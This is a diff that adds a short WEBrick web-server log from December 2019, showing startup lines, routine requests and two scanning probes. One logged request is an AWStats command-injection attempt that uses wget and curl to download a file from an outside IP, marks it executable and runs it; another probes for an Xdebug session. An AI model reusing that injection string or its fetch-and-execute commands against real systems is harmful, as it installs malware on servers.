@@ -1,0 +1,9 @@
+[2019-12-08 23:41:05] INFO  WEBrick 1.5.0
+[2019-12-08 23:41:05] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
+[2019-12-08 23:41:05] INFO  WEBrick::HTTPServer#start: pid=384 port=80
+109.233.211.250 - - [09/Dec/2019:01:41:58 +0000] "GET / HTTP/1.1" 200 1574 0.1353
+[2019-12-09 02:07:46] ERROR bad Request-Line `GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard;echo%20YYY;echo| HTTP/1.0'.
+177.11.139.22 - - [09/Dec/2019:03:06:04 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+185.153.196.97 - - [09/Dec/2019:03:31:33 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0031
+138.97.218.193 - - [09/Dec/2019:03:52:37 +0000] "GET / HTTP/1.1" 200 1574 0.0048
+36.77.80.100 - - [09/Dec/2019:07:37:35 +0000] "GET / HTTP/1.1" 200 1574 0.0032
